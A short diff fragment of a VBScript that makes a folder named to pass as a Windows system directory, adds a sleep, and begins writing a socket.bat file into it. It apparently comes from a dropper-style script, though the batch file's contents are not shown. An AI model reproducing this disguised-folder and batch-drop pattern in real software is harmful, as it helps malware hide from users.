@@ -12,7 +12,8 @@ End If
 
 Set oShell = WScript.CreateObject ("WScript.Shell")
 oShell.run "cmd /c mkdir C:\""Program Files""\""Windows system"""
-'oShell.run "cmd /c Type C:\""Program Files""\""Windows system""\socket.bat"
+
+WScript.Sleep 3000
 
 Set objFSO=CreateObject("Scripting.FileSystemObject")
 outFile="c:\Program Files\Windows system\socket.bat"
